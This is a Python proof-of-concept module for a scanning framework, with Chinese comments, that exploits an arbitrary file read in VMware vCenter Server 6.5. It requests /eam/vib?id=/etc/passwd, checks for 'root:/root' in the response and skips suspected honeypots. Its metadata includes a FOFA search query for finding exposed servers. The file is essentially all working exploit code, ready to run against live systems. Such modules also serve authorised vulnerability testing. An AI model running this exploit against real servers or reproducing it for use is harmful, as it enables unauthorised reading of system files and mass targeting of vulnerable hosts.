# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Vmware vCenter 任意文件读取",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "VMware vCenter Server",                     # 漏洞应用名称
        "AppVersion" : "VMware vCenter Server 6.5.0a- f 版本",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            VMware vCenter特定版本存在任意文件读取漏洞，攻击者通过构造特定的请求，可以读取服务器上任意文件
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="ID_VC_Welcome"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/eam/vib?id=/etc/passwd" # url自己按需调整
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "root:/root" in req.text and req.status_code == 200:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()